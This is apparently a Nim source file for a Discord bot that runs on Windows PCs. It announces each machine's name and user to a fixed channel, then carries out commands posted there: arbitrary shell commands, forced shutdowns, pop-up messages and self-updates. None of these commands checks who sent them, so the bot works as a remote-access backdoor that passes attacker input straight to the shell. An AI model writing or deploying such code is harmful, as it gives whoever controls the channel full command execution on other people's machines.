import dimscord, asyncdispatch, options, os, strutils
import dotenv
import constants
import checkForUpdates

let env = initDotEnv()
env.load()

const CHANNEL*: string = "847087245605601290"

let THISPC*: string = getEnv("COMPUTERNAME")
let TOKEN*: string = getEnv("TOKEN")

var THISPCSTR*: string = "`" & THISPC & "`: "
var alias: string = "xxxxxx"

try:
  let aliasFile = readFile("alias")

  alias = aliasFile

  THISPCSTR = "`" & alias & "(" & THISPC & ")`: "
except:
  discard

let discord = newDiscordClient(TOKEN)

proc showName(discord: DiscordClient) =
  discard discord.api.sendMessage(
    CHANNEL,
    THISPCSTR & "started `" & $VERSION & "` as " & getEnv("USERNAME")
  )

proc onReady(s: Shard, r: Ready) {.event(discord).} =
  echo "Ready as " & $r.user

  showName discord

proc messageCreate(s: Shard, m: Message) {.event(discord).} =
  case m.content
  of "!ping":
    discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "pong")
  of "!teiubi", "!teiubi:(":
    if m.author.id == "762179762860326923" or m.author.id == "561593145977208836":
      discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "sieuteiubi:(")
    else:
      discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "eu o iubi doar pe maria:(")
  of "!list":
    showName discord
  else:
    try:
      if m.content.startsWith(THISPC) or m.content.startsWith(alias):
        var command: string

        if m.content.startsWith(THISPC):
          command = m.content.split(THISPC & " ")[1]
        elif m.content.startsWith(alias):
          command = m.content.split(alias & " ")[1]

        if (command.startsWith("shutdown")):
          try:
            let msg: string = command.split("shutdown ")[1]

            discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "shutting down")
            discard execShellCmd("shutdown /s /t 10 /c \"" & msg & "\"")

          except:
            discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "shutting down")
            discard execShellCmd("shutdown /s /t 10")

        if (command.startsWith("quit")):
          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "quitting")

          quit(0)

        if (command.startsWith("update")):
          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "trying to update")

          checkForUpdates()

        if (command.startsWith("version")):
          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & $VERSION)

        elif (command.startsWith("cmd")):
          let cmd: string = command.split("cmd ")[1]

          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "running cmd")

          let errCode = execShellCmd(cmd)

          discard await discord.api.sendMessage(
            CHANNEL,
            THISPCSTR & "ran with err code: " & $errCode
          )
        elif (command.startsWith("alias")):
          let alias_msg: string = command.split("alias ")[1]

          alias = alias_msg

          THISPCSTR = "`" & alias & "(" & THISPC & ")`: "

          writeFile("alias", alias)

          discard await discord.api.sendMessage(
            CHANNEL,
            THISPCSTR & "new alias: `" & alias & "`"
          )

        elif (command.startsWith("msg")):
          let message: string = command.split("msg ")[1]

          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "showing message")

          let errCode = execShellCmd("msg %username% " & message)

          discard await discord.api.sendMessage(
            CHANNEL,
            THISPCSTR & "ran with err code: " & $errCode
          )
    except:
      discard

waitFor discord.startSession()
